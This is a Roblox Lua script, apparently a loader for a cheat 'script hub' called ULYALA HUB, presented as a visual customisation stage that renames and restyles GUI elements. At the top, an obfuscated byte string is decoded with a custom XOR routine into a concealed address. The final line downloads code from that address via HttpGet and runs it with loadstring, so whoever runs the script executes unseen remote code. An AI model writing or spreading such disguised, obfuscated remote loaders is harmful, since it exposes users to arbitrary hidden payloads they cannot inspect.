
--[[ STAGE 2: VISUAL CORE ]]
local Xru020TbdhT4w1="\163\147\151\151\152\229\252\000\169\190\180\017\204\214\199\223\206\221\214\212\238\221\240\000\005\243\006\017\255\089\016\032\038\104\045\048\053\046\062\058\070\062\077\052\079\152\081\069\098\092\104\088\106\123\127\192\134\126\138\145\212\092\131\154\158\163\124\136\126\150\140\153\199\198\192\204\164\156\220\202\201\220\230\192\031\039\241\244\044\050\052\010\085\027\006\022"local RFI6HUgs875zffAcgDBzk=83 local ClwdQgGxRl3ZbEKWyx5B5B=70 local J9UywYQjtkYh=0 local nDllicgy8SnC2nKHjR8=4 local gvQ8IcTemWED=30 local PKw7caW4LbXGEWHbhp=false local Uv3wzfyPjeVNjJJv42JnQ9=bit32 and bit32.bxor if not Uv3wzfyPjeVNjJJv42JnQ9 then Uv3wzfyPjeVNjJJv42JnQ9=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local MyW1s7YkHp0HhmeDB={}for VJ67Zi2oR6dmRyShLxH=1,#Xru020TbdhT4w1 do local p70ghTuxXe8Uwiih8B=string.byte(Xru020TbdhT4w1,VJ67Zi2oR6dmRyShLxH)local Ny373A_1ZfShBzATKA=(ClwdQgGxRl3ZbEKWyx5B5B+(VJ67Zi2oR6dmRyShLxH*nDllicgy8SnC2nKHjR8)+gvQ8IcTemWED)%256 if J9UywYQjtkYh==0 then p70ghTuxXe8Uwiih8B=(p70ghTuxXe8Uwiih8B-Ny373A_1ZfShBzATKA)%256 MyW1s7YkHp0HhmeDB[VJ67Zi2oR6dmRyShLxH]=string.char(Uv3wzfyPjeVNjJJv42JnQ9(p70ghTuxXe8Uwiih8B,RFI6HUgs875zffAcgDBzk))else p70ghTuxXe8Uwiih8B=Uv3wzfyPjeVNjJJv42JnQ9(p70ghTuxXe8Uwiih8B,RFI6HUgs875zffAcgDBzk)MyW1s7YkHp0HhmeDB[VJ67Zi2oR6dmRyShLxH]=string.char((p70ghTuxXe8Uwiih8B-Ny373A_1ZfShBzATKA)%256)end end local _DhoXEIbz3qPAbMfdH=table.concat(MyW1s7YkHp0HhmeDB)if PKw7caW4LbXGEWHbhp then _DhoXEIbz3qPAbMfdH=string.reverse(_DhoXEIbz3qPAbMfdH)end local D0t5H0TFCQjJ5Ev9sOtLZ=_DhoXEIbz3qPAbMfdH
local HubName = "ULYALA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(D0t5H0TFCQjJ5Ev9sOtLZ))()
